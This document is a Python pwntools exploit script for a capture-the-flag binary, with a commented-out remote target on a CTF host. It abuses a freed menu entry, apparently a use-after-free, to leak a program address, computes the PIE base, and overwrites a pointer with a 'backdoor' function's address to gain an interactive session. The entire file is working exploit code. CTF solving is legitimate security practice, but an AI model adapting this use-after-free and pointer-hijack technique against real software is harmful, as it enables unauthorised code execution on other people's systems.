from pwn import *
context.log_level="debug"
sh=process("./chal")
# sh=remote("cha.hackpack.club",41705)
def cmd(c):
    sh.sendlineafter(b"Choose option: ", str(c).encode())
def add(idx,name,number):
    cmd(1)
    sh.sendlineafter(b"Enter index of new number (0-9): ", str(idx).encode())
    sh.sendlineafter(b"Enter object name: ", name)
    sh.sendlineafter(b"Enter number: ", str(number).encode())
def delete(idx):
    cmd(2)
    sh.sendlineafter(b"Enter index of number to delete (0-9): ", str(idx).encode())
def edit(idx,number):
    cmd(3)
    sh.sendlineafter(b"Enter index of number to edit (0-9): ", str(idx).encode())
    sh.sendlineafter(b"Enter new number: ", str(number).encode())
def show(idx):
    cmd(4)
    sh.sendlineafter(b"Select index of number to print (0-9): ", str(idx).encode())
def showall(idx):
    cmd(5)
def back():
    cmd(6)

add(0,b"bbb",0x1234)
add(1,b"aaa",0x1234)
gdb.attach(sh)
delete(0)
back()
show(0)
sh.recvuntil(b"\n")
leak_pie=int(sh.recvuntil(b"\n",True).decode())
success("leak_pie:"+hex(leak_pie))
pie_base=leak_pie-0x1257
success("pie_base:"+hex(pie_base))
backdoor=pie_base+0x1244
edit(0,backdoor)
back()
sh.interactive()